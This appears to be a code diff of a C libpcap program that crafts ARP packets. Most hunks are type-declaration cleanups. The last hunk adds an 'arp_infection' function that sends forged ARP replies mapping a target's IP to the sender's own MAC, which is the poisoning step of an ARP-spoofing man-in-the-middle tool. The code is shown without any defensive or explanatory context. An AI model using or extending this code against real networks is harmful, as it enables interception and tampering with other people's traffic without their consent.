@@ -74,8 +74,8 @@ void get_my_ip(uint8_t *addr, char *interface)
 void make_arp(u_char *packet, uint8_t *src_mac, uint8_t *dst_mac, uint16_t op,
 			  uint8_t *send_mac, uint8_t *send_ip, uint8_t *tar_mac, uint8_t *tar_ip) 
 {
-	struct ether_header ethhdr;
-	struct arp_header arphdr;
+	ether_header ethhdr;
+	arp_header arphdr;
 
 	memcpy(ethhdr.dst_mac, dst_mac, 6);
 	memcpy(ethhdr.src_mac, src_mac, 6);
@@ -110,8 +110,8 @@ void get_mac_addr(uint8_t *ip_addr)
 		int res = pcap_next_ex(handle, &header, &recv_pkt);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
-		struct ether_header *ethhdr = (ether_header*)recv_pkt;
-		struct arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));
+		ether_header *ethhdr = (ether_header*)recv_pkt;
+		arp_header *arphdr = (arp_header*)(recv_pkt + sizeof(ether_header));
 
 		if((ntohs(ethhdr->ether_type) == ETHERTYPE_ARP) && 
 	   	   (ntohs(arphdr->op) == ARP_REPLY) &&
@@ -123,4 +123,13 @@ void get_mac_addr(uint8_t *ip_addr)
 	}
 }
 
+void arp_infection(session s)
+{
+	u_char send_pkt[50];
+
+	make_arp(send_pkt, my_mac, ip2mac[s.send_ip], 
+		 ARP_REPLY, my_mac, (uint8_t*)&s.tar_ip, 
+		 ip2mac[s.send_ip], (uint8_t*)&s.send_ip);
+	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);
+}
 
